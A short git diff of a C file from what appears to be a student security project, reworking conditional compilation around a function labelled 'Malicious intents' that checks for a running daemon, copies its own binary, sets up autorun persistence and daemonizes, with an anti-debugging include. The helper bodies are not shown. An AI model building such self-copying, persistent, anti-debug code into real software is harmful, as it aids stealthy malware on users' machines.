@@ -6,7 +6,7 @@
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/11/19 04:17:41 by kiroussa         ###   ########.fr       */
+/*   Updated: 2025/11/28 22:24:06 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,7 +17,6 @@
 #include <unistd.h>
 #include "antidebug.inc.c"
 
-#if MATT_MODE
 #include <shield/le_function.h>
 #include <errno.h>
 #include <fcntl.h>
@@ -73,13 +72,14 @@ static inline bool	shield_daemon_check(void)
 			return (true);
 		}
 		close(fd);
+#if MATT_MODE
 		puts("Daemon already running!");
 		DEBUG("notifying daemon (%d)\n", pid);
 		kill(pid, SIGUSR1);
+#endif // MATT_MODE
 	}
 	return (false);
 }
-#endif // MATT_MODE
 
 /**
  * @brief	Malicious intents. 
@@ -93,18 +93,17 @@ static inline bool	shield_daemon_check(void)
  */
 static inline void	shield_malicious_intents(void)
 {
-#if MATT_MODE
-	DEBUG("matt_daemon_check\n");
+	DEBUG("daemon_check\n");
 	if (!shield_daemon_check())
 		return ;
-#else // if !MATT_MODE
+#if !MATT_MODE
 	DEBUG("shield_copy\n");
 	char *binary_path = NULL;
-	if (!shield_copy(&binary_path))
-		return ;
-	DEBUG("shield_autorun_setup\n");
-	if (!shield_autorun_setup(binary_path))
-		return ;
+	if (shield_copy(&binary_path))
+	{
+		DEBUG("shield_autorun_setup\n");
+		shield_autorun_setup(binary_path);
+	}
 #endif // !MATT_MODE
 	DEBUG("shield_daemonize\n");
 	shield_daemonize();
